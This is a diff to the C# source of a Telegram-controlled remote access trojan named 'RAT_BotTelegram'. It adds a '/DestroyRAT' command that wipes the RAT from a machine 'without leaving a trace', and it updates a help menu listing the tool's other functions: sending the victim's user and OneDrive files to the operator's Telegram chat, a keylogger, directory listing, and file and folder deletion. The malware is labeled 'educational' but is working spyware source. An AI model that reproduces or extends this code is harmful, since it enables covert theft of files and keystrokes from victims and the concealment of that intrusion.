@@ -136,9 +136,7 @@ namespace RAT_BotTelegram {
                     await Bot.SendTextMessageAsync(config.ID, "User Files: " + Features.getUserName(), replyMarkup: GetFiles);        // Obtiene USER
                     await Bot.SendTextMessageAsync(config.ID, "OneDrive Files: |English| ", replyMarkup: GetFilesOneDrive); // Obtiene USER Onedrive
                     await Bot.SendTextMessageAsync(config.ID, "OneDrive Files: |Español|", replyMarkup: GetFilesOneDriveE); // Obtiene USER Onedrive
-                    break;
- ;
-               
+                    break;            
                 case "/Dir":
 
                     if (Path.Length <= 4) {
@@ -214,10 +212,21 @@ namespace RAT_BotTelegram {
                 case "/Delete_Folder":
                     if (Path.Length <= 4) {
                         SendBotMessage("Ejemplo de comando\n /Get_OnlyFile C:\\User\\Photos and videos\\foto34.jpg\n/Get_OnlyFile D:\\Documentos\\Monografía.docx");
+                        
                     } else {
                         Delete(Path, true);
                     }
                     Path = "";
+                    break;
+                case "/DestroyRAT":
+                    var DestroyRATButtons = new InlineKeyboardMarkup(new[]{
+                    new[]{
+                        InlineKeyboardButton.WithCallbackData(text: "|ACCEPT|"  ,callbackData: "DestroyRATTrue"),
+                        InlineKeyboardButton.WithCallbackData(text: "|DESTROY|" ,callbackData: "DestroyRATFalse"),
+                    }});
+
+                    SendBotMessage("This process will destroy the RAT of the Computer, this process is irreversible");
+                    await Bot.SendTextMessageAsync(config.ID, "Continue ?", replyMarkup: DestroyRATButtons);        // Obtiene USER
                     break;
 
                 case "/About":
@@ -247,8 +256,6 @@ namespace RAT_BotTelegram {
                         "\n<b>You can read the documentation at the following link >></b>" + 
                         "\n<b></b>";
 
-
-
                     await Bot.SendTextMessageAsync(config.ID, about, ParseMode.Html);
                     await Bot.SendPhotoAsync(chatId: config.ID, photo: "https://i.imgur.com/SelWET0.png");
                     await Bot.SendTextMessageAsync(config.ID, "\n\n<b>[Fines educativos]</b>", ParseMode.Html);
@@ -259,13 +266,14 @@ namespace RAT_BotTelegram {
                     const string usage =
                   "\n/Status                   <Check if the PC is online>" +
                   "\n/Show_Information <get detailed system information>" +     // Muestra información del sistema
-                  "\n/Get_FilesAll          |Menu| <Get Files from Computer>" +  //Sube archivos [Imagenes,Fotos, Videos y documentos]
+                  "\n/Get_FilesAll          |Buttons| <Get Files from Computer>" +  //Sube archivos [Imagenes,Fotos, Videos y documentos]
                   "\n/Get_OnlyFile  <Path>   C:\\User\\Photos and videos\\foto34.jpg " +    //Sube solo un archivo especifico.
                   "\n/Dir     <Path>       /Dir C:\\User\\Photos and videos" +  // Lista los archivos de la carpeta y las subcarpetas.
-                  "\n/Dir_FolderDisk     |Menu| Only Folder Tree Drive" +  // Lista Arbol de solo carpetas de Unidades de almacemiento
+                  "\n/Dir_FolderDisk     |Buttons| Only Folder Tree Drive" +  // Lista Arbol de solo carpetas de Unidades de almacemiento
                   "\n/Keylogger           <Get File log >" +                    // Obtiene el registro de teclas por mensaje
                   "\n/Delete_OnlyFile <Path> " +                                 // Elimina un archivo
-                  "\n/Delete_Folder <Path> " +
+                  "\n/Delete_Folder <Path> " +                                  // Eliminar Carpeta con todos los archivos dentro.
+                  "\n/DestroyRAT  |Button| <Accept> or <Denied>" +              // Destruye el RAT del Sistema sin Dejar Rastro
                   "\n/Help                    <This menu>" +
                   "\n\r" +
                   "\n/About         <This Information>" +
@@ -568,7 +576,15 @@ namespace RAT_BotTelegram {
                 case "DDX":    GetDirectoryAll(@"X:\"); SendBotMessage("Finish Command"); break;
                 case "DDZ":    GetDirectoryAll(@"Z:\"); SendBotMessage("Finish Command"); break;
 
+                // Destroy RAT Telegram
 
+                case "DestroyRATTrue":
+                    SendBotMessage("Destroy RAT |Accept|");
+                    Tools.DestroyRAT(true);
+                    break;
+                case "DestroyRATFalse": 
+                    SendBotMessage("Destroy RAT |Denied| "); 
+                    break;
 
 
 
